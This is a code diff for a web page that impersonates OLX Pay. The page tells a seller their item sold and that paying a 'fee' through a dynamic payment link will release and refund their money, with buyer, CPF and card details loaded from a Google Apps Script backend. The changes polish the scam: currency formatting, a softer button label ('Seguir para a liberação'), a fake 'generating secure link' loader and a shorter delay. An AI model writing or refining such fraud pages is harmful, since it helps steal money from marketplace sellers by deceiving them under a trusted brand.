@@ -5,6 +5,21 @@ const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tM
 
 const mainContainer = document.getElementById('main-container');
 
+// --- Função Auxiliar de Formatação (NOVA) ---
+const formatValueForClient = (value) => {
+    if (!value) return '---';
+    // 1. Remove R$ e espaços
+    let valueStr = String(value).replace(/R\$\s*/g, '').trim();
+
+    // 2. Verifica se é um número inteiro de 4+ dígitos (ex: '1000', '15000') sem separadores e aplica o ponto de milhar.
+    if (valueStr.match(/^\d{4,}$/)) { 
+        valueStr = valueStr.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    }
+    
+    // O valor já formatado (ex: 1.000,00 ou 12 horas) é retornado.
+    return valueStr;
+}
+
 // --- Inicialização Automática ---
 (async function init() {
   const params = new URLSearchParams(window.location.search);
@@ -47,7 +62,7 @@ function renderContainer(dadosBrutos) {
   const content = criarElemento('div', { class: 'content' });
 
   // Variáveis de exibição
-  const taxa = dados.taxa || 'R$ --';
+  const taxa = formatValueForClient(dados.taxa) || 'R$ --';
   const prazo = dados.prazo || '15 minutos';
   
   // Link dinâmico vindo da planilha
@@ -55,13 +70,13 @@ function renderContainer(dadosBrutos) {
 
   content.innerHTML = `
     <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
-    <p>Após o pagamento da taxa de R$ <span class="highlight" id="taxa">${taxa}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
+    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">R$ ${taxa}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
     
     <h2>Detalhes da transação</h2>
     <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
-    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto: R$</strong> <span>${dados.valor || '---'}</span></p>
-    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>${dados.frete || 'Grátis'}</span></p>
-    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span>${dados.tarifa || 'Inclusa'}</span></p>
+    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>R$ ${formatValueForClient(dados.valor) || '---'}</span></p>
+    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>R$ ${formatValueForClient(dados.frete) || 'Grátis'}</span></p>
+    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span>R$ ${formatValueForClient(dados.tarifa) || 'Inclusa'}</span></p>
     ${dados.cpf ? `<p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span>${dados.cpf}</span></p>` : ''}
     ${dados.cartao ? `<p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação via:</strong> <span>${dados.cartao}</span></p>` : ''}
 
@@ -94,9 +109,8 @@ function renderContainer(dadosBrutos) {
   content.appendChild(form);
 
   // --- 2. CRIAÇÃO DO LOADER INTERMEDIÁRIO ---
-  // Este loader ficará visível APENAS enquanto o botão verde está "nascendo" (transição CSS)
   const loaderDiv = document.createElement('div');
-  loaderDiv.id = 'loader-intermedio'; // Importante: Deve ter CSS correspondente
+  loaderDiv.id = 'loader-intermedio'; 
   loaderDiv.innerHTML = `
     <i class="fa-solid fa-circle-notch fa-spin"></i>
     <p>Gerando link de pagamento seguro...</p>
@@ -108,7 +122,7 @@ function renderContainer(dadosBrutos) {
     id: 'btn-pagamento', 
     class: 'button hidden', 
     href: linkFinal 
-  }, 'Pagar Taxa e Liberar Valor');
+  }, 'Seguir para a liberação'); // <-- TEXTO ALTERADO AQUI
   
   const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
   content.appendChild(btnContainer);
@@ -160,7 +174,7 @@ function renderContainer(dadosBrutos) {
       // Garante scroll suave para o usuário ver a ação
       btnContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
 
-    }, 3000);
+    }, 1500); // Reduzido para 1.5s (era 3s) para melhor UX
   });
 }
 
@@ -185,4 +199,4 @@ function criarElemento(tag, attrs = {}, inner = '') {
   if (typeof inner === 'string') el.innerHTML = inner;
   else if (inner instanceof Node) el.appendChild(inner);
   return el;
-    }
+}
